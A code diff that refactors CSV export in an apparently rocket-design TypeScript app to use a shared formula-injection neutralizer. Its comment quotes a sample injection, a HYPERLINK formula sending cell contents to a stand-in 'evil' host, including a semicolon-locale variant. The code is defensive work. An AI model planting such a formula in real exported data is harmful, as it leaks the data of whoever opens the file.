@@ -5,7 +5,7 @@ import { fmtSi, type UnitSelection } from '../../prefs/units';
 import { plainDecimal } from '../files/numberText';
 import { staticInfoRows } from './designInfo';
 import { type StatKey } from './designInfo';
-import { neutralizeFormula } from '../exports/csvCell';
+import { csvField } from '../exports/csvCell';
 import { CSV_MIME } from '../exports/csvExport';
 
 /**
@@ -21,21 +21,20 @@ import { CSV_MIME } from '../exports/csvExport';
 const round = (v: number, d: number): string => plainDecimal(v, d);
 
 /**
- * RFC-4180 cell, with spreadsheet formula injection neutralized.
+ * RFC-4180 cell, with spreadsheet formula injection neutralized by the rule
+ * every CSV writer shares (`csvField`).
  *
  * Values here are file-sourced: `model.name` is the `<name>` of an imported
- * `.ork` and the fin-set labels are its node names. A rocket named
- * `=HYPERLINK("http://evil/?"&A1,"Open")` would otherwise execute when the
- * exported CSV is opened in Excel or Sheets, so a leading formula trigger gets
- * a `'` in front of it. Same rule as `flightPathExport.ts`.
+ * `.ork` and the fin-set and part labels are its node names. A rocket named
+ * `=HYPERLINK("http://evil/?"&A1,"Open")`, or `x;=HYPERLINK(...)` read in a
+ * locale that splits on `;`, would otherwise execute when the exported CSV is
+ * opened in Excel or Sheets. Figures go through the same function and stay
+ * numeric, negatives included.
  *
  * A lone `\r` is quoted too: the file's own terminator is `\r\n`, so an
  * unquoted bare CR inside a name splits the record for RFC-4180 readers.
  */
-const cell = (s: string): string => {
-  const safe = neutralizeFormula(s);
-  return /[",\r\n]/.test(safe) ? `"${safe.replace(/"/g, '""')}"` : safe;
-};
+const cell = (s: string): string => csvField(s);
 
 /** [field, value, unit] rows for one summary, in the user's units. */
 function summaryRows(info: StaticInfo, units: UnitSelection): [string, string, string][] {
